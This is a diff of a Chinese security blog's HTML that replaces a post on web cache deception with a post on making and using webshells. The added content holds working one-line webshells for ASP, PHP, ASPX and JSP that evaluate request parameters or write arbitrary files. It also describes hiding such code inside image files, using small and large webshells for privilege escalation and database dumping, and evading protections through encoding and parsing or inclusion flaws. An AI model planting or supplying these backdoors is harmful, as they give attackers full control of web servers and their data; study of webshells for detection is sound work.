@@ -108,18 +108,18 @@
 
 
 
-  <meta name="description" content="Web缓存欺骗攻击Web缓存欺骗攻击是一种攻击方式，原理就是Web应用在使用缓存时没有正确验证，从而使攻击者实现了缓存泄露攻击。">
-<meta name="keywords" content="Web缓存欺骗">
+  <meta name="description" content="脚本木马的制作及原理 什么是脚本木马？ 脚本木马能干什么？ 脚本木马怎么做？">
+<meta name="keywords" content="webshell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web缓存欺骗攻击">
-<meta property="og:url" content="https://bookchi.github.io/2019/03/26/Web缓存欺骗攻击/index.html">
+<meta property="og:title" content="脚本木马制作及原理">
+<meta property="og:url" content="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/index.html">
 <meta property="og:site_name" content="fuubar2">
-<meta property="og:description" content="Web缓存欺骗攻击Web缓存欺骗攻击是一种攻击方式，原理就是Web应用在使用缓存时没有正确验证，从而使攻击者实现了缓存泄露攻击。">
+<meta property="og:description" content="脚本木马的制作及原理 什么是脚本木马？ 脚本木马能干什么？ 脚本木马怎么做？">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-26T15:16:28.928Z">
+<meta property="og:updated_time" content="2019-03-30T12:30:55.177Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Web缓存欺骗攻击">
-<meta name="twitter:description" content="Web缓存欺骗攻击Web缓存欺骗攻击是一种攻击方式，原理就是Web应用在使用缓存时没有正确验证，从而使攻击者实现了缓存泄露攻击。">
+<meta name="twitter:title" content="脚本木马制作及原理">
+<meta name="twitter:description" content="脚本木马的制作及原理 什么是脚本木马？ 脚本木马能干什么？ 脚本木马怎么做？">
 
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <link rel="canonical" href="https://bookchi.github.io/2019/03/26/Web缓存欺骗攻击/"/>
+  <link rel="canonical" href="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/"/>
 
 
 
@@ -138,7 +138,7 @@
   };
 </script>
 
-  <title>Web缓存欺骗攻击 | fuubar2</title>
+  <title>脚本木马制作及原理 | fuubar2</title>
   
 
 
@@ -300,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/26/Web缓存欺骗攻击/">
+    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fuubar">
@@ -317,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Web缓存欺骗攻击
+          <h1 class="post-title" itemprop="name headline">脚本木马制作及原理
               
             
           </h1>
@@ -342,7 +342,7 @@
                 
               
 
-              <time title="Created: 2019-03-26 22:59:35 / Modified: 23:16:28" itemprop="dateCreated datePublished" datetime="2019-03-26T22:59:35+08:00">2019-03-26</time>
+              <time title="Created: 2019-03-30 20:29:17 / Modified: 20:30:55" itemprop="dateCreated datePublished" datetime="2019-03-30T20:29:17+08:00">2019-03-30</time>
             
 
             
@@ -365,6 +365,13 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/Webshell/" itemprop="url" rel="index"><span itemprop="name">Webshell</span></a></span>
 
                 
                 
@@ -398,8 +405,64 @@
       
 
       
-        <h3 id="Web缓存欺骗攻击"><a href="#Web缓存欺骗攻击" class="headerlink" title="Web缓存欺骗攻击"></a>Web缓存欺骗攻击</h3><p>Web缓存欺骗攻击是一种攻击方式，原理就是Web应用在使用缓存时没有正确验证，从而使攻击者实现了缓存泄露攻击。</p>
+        <h3 id="脚本木马的制作及原理"><a href="#脚本木马的制作及原理" class="headerlink" title="脚本木马的制作及原理"></a>脚本木马的制作及原理</h3><blockquote>
+<p>什么是脚本木马？</p>
+<p>脚本木马能干什么？</p>
+<p>脚本木马怎么做？</p>
+</blockquote>
 <a id="more"></a>
+<h4 id="webshell制作原理"><a href="#webshell制作原理" class="headerlink" title="webshell制作原理"></a>webshell制作原理</h4><h5 id="webshell的种类"><a href="#webshell的种类" class="headerlink" title="webshell的种类"></a>webshell的种类</h5><p>webshell就是wen后门，方便我们对网站进行任意修改；</p>
+<p>分类：一句话木马；小马；大马；打包马；脱库马；etc</p>
+<h5 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h5><ul>
+<li><p>一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 短小精悍，功能强大，*隐蔽性*很好；在入侵中时钟扮演着强大的作用</span><br><span class="line"></span><br><span class="line"># 执行客户端传过来的数据value；关键在于传输的value</span><br><span class="line">&lt;% execute request(&quot;value&quot;) %&gt;	# 支持get，post等方法 cookie也可以</span><br><span class="line">&lt;% eval request(&quot;value&quot;) %&gt;</span><br><span class="line"># eval也可以改成system()/exec()</span><br><span class="line"></span><br><span class="line"># 常见写法:</span><br><span class="line"># asp</span><br><span class="line">&lt;% eval request(&quot;value&quot;) %&gt;	</span><br><span class="line"></span><br><span class="line"># php</span><br><span class="line">&lt;?php @eval($_POST[&apos;value&apos;]); ?&gt;	</span><br><span class="line"></span><br><span class="line"># aspx</span><br><span class="line">&lt;%@ Page Lanuage=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br><span class="line"></span><br><span class="line"># jsp</span><br><span class="line">&lt;%</span><br><span class="line">if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"># 一句话变形</span><br><span class="line">。。。。。。</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>使用方法</p>
+<p>假设已经上传了webshell；</p>
+<p>菜刀是连接webshell的客户端；也有html格式的客户端；<em>编码问题</em></p>
+<p>使用菜刀去连接shell.php：文件管理；数据库管理；虚拟终端(可用来执行命令)；</p>
+</li>
+</ul>
+</li>
+<li><p>一句话图片马</p>
+<ul>
+<li>找一个正常的图片，然后把木马加进去；</li>
+</ul>
+<blockquote>
+<ol>
+<li>windows下，右击图片，在版权里加入一句话</li>
+<li>使用cmd合并图片和一句话脚本：cmd /b 1.jpg+shell.php shell1.jpg</li>
+<li>使用c32,16进制显示图片，把一句话以hex形式复制进去</li>
+</ol>
+</blockquote>
+<ul>
+<li><p>把图片改成脚本格式</p>
+</li>
+<li><p>常见一句话客户端：</p>
+<p>中国菜刀、中国砍刀、xise菜刀、lanker、Weevely、zv新型php一句话木马客户端</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h5><p>diy.asp，可以做免杀；用来上传大马；</p>
+<p>小马不能用菜刀去连接，直接去访问；</p>
+<h5 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h5><p>大马体积较大，一般50K以上。功能较多，一般包括提权命令、磁盘管理、数据库连接接口、执行命令；</p>
+<p>但隐蔽性不好，不加密的话会被杀掉；</p>
+<h4 id="webshell使用技巧"><a href="#webshell使用技巧" class="headerlink" title="webshell使用技巧"></a>webshell使用技巧</h4><h5 id="一句话的使用"><a href="#一句话的使用" class="headerlink" title="一句话的使用"></a>一句话的使用</h5><p>就是要把一句话代码以脚本格式运行，或者写入数据库；</p>
+<h5 id="小马-1"><a href="#小马-1" class="headerlink" title="小马"></a>小马</h5><p>主要用来上传大马</p>
+<h5 id="大马-1"><a href="#大马-1" class="headerlink" title="大马"></a>大马</h5><p>主要用途：提权、打包、脱裤、增删文件etc</p>
+<h5 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h5><p>内容编码：如果有防护，可以用编码去绕；</p>
+<p>配合解析漏洞：可能上传图片，然后要改文件的格式，改格式要利用解析漏洞；</p>
+<p>配合文件包含</p>
+<p>利用文件名溢出</p>
+<h4 id="webshell黑吃黑"><a href="#webshell黑吃黑" class="headerlink" title="webshell黑吃黑"></a>webshell黑吃黑</h4><p>后门：有的是自动去连接；有的是触发后门(比如点击了查看报告按钮)；</p>
+<p>大概就是，如果我用菜刀去连接shell，菜刀本身有后门，会把我上传的shell信息发送给留后门者的服务器；</p>
+<p>但我可以把某些地方，比如密码的地方，输入xss代码，转而去窃取留后门者的cookie；</p>
+<p>怎么找菜刀的后门？</p>
+<p>菜刀的后门：http(WSExplorer)、tcp(wireshark)</p>
+<p>怎么删后门？对http：修改host文件，比如要传给<a href="http://www.fuubar.com，那就把它对应的IP改掉；" target="_blank" rel="noopener">www.fuubar.com，那就把它对应的IP改掉；</a></p>
+<p>tcp的比较困难，还需要反汇编；</p>
+
       
     </div>
 
@@ -418,12 +481,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2019/03/26/Web缓存欺骗攻击/">Web缓存欺骗攻击</a></p>
+  <p><span>本文标题:</span><a href="/2019/03/30/脚本木马制作及原理/">脚本木马制作及原理</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 fuubar 的个人博客">fuubar</a></p>
-  <p><span>发布时间:</span>2019年03月26日 - 22:03</p>
-  <p><span>最后更新:</span>2019年03月26日 - 23:03</p>
-  <p><span>原始链接:</span><a href="/2019/03/26/Web缓存欺骗攻击/" title="Web缓存欺骗攻击">https://bookchi.github.io/2019/03/26/Web缓存欺骗攻击/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/26/Web缓存欺骗攻击/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年03月30日 - 20:03</p>
+  <p><span>最后更新:</span>2019年03月30日 - 20:03</p>
+  <p><span>原始链接:</span><a href="/2019/03/30/脚本木马制作及原理/" title="脚本木马制作及原理">https://bookchi.github.io/2019/03/30/脚本木马制作及原理/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -454,7 +517,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web缓存欺骗/" rel="tag"># Web缓存欺骗</a>
+            <a href="/tags/webshell/" rel="tag"># webshell</a>
           
         </div>
       
@@ -467,8 +530,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/25/bufferoverflow原理/" rel="next" title="bufferoverflow原理">
-                <i class="fa fa-chevron-left"></i> bufferoverflow原理
+              <a href="/2019/03/29/sqlmap使用/" rel="next" title="sqlmap使用">
+                <i class="fa fa-chevron-left"></i> sqlmap使用
               </a>
             
           </div>
@@ -476,10 +539,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/27/其他类型注入/" rel="prev" title="其他类型注入">
-                其他类型注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -638,7 +697,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web缓存欺骗攻击"><span class="nav-number">1.</span> <span class="nav-text">Web缓存欺骗攻击</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本木马的制作及原理"><span class="nav-number">1.</span> <span class="nav-text">脚本木马的制作及原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell制作原理"><span class="nav-number">1.1.</span> <span class="nav-text">webshell制作原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#webshell的种类"><span class="nav-number">1.1.1.</span> <span class="nav-text">webshell的种类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一句话木马"><span class="nav-number">1.1.2.</span> <span class="nav-text">一句话木马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#小马"><span class="nav-number">1.1.3.</span> <span class="nav-text">小马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#大马"><span class="nav-number">1.1.4.</span> <span class="nav-text">大马</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell使用技巧"><span class="nav-number">1.2.</span> <span class="nav-text">webshell使用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一句话的使用"><span class="nav-number">1.2.1.</span> <span class="nav-text">一句话的使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#小马-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">小马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#大马-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">大马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用技巧"><span class="nav-number">1.2.4.</span> <span class="nav-text">使用技巧</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell黑吃黑"><span class="nav-number">1.3.</span> <span class="nav-text">webshell黑吃黑</span></a></li></ol></li></ol></div>
             
 
           </div>
